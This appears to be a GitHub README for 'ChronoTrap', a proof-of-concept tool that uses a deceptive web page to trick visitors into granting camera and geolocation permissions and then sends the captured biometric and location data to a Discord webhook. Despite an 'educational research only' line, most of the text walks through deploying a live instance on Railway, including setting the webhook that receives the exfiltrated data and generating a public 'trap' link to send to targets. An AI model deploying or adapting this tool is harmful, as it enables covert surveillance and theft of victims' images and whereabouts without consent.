ChronoTrap: A Biometric & Geolocation Exfiltration PoC

"A Cybersecurity PoC demonstrating browser-based social engineering and permission chaining via deceptive UI/UX to exfiltrate biometric and geolocation data."

Frontend: HTML5 MediaDevices & Geolocation API.

Backend: Node.js/Express running on Railway.

Exfiltration: Data tunneled to Discord via Webhooks.

educational research only


🛤️ Deploying to Railway
This project is optimized for deployment on Railway. Follow these steps to get your own instance running in minutes.

1. Fork this Repository
Click the Fork button at the top right of this page to create a copy of this project under your own GitHub account.

2. Connect to Railway
Log in to the Railway Dashboard.

Click + New Project > Deploy from GitHub repo.

Select your forked ChronoTrap repository.

3. Configure Environment Variables
Railway needs to know where to send the exfiltrated data. You must set these before the app will work correctly.

In your Railway project, go to the Variables tab.

Add the following variable:

Variable Name: DISCORD_WEBHOOK

Value: Your private Discord Webhook URL.

4. Networking & Public URL
Go to the Settings tab of your Railway service.

Under Networking, click Generate Domain.

Railway will provide a link (e.g., https://chronotrap-production.up.railway.app). This is your live "trap" link.
